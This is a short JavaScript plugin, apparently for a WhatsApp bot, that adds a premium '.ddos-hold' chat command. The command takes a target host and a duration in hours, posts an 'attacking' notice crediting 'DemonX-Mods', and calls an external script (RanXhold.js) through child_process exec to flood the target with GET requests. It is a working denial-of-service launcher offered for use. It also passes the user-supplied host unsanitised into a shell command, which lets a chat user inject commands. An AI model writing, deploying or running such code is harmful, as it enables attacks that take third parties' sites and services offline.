const { exec } = require('child_process')

const handler = async (m, { args }) => {
    if (args.length < 2) {
        m.reply(`\`\`\`[🔍] .ddos-hold [link] [duration]\`\`\``)
        return;
    }

    const hostname = args[0];
    const duration = args[1];

conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title:  global.title,
body: ``,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: global.attacking,
sourceUrl: ``
}}, text: `\`DDoS HOLD\`
\`Host:\` ${hostname}
\`User:\` ${m.sender}
\`Duration:\` ${duration} Hours
\`Creator:\` DemonX-Mods`}, {quoted: m})
    exec(`node ./lib/SkyranXMODS/RanXhold.js GET ${hostname} 10 ${duration}`);
}

handler.help = ['hold']
handler.tags = ['tools', 'attack'];
handler.premium = true
handler.command = /^(ddos-hold)$/i;
module.exports = handler
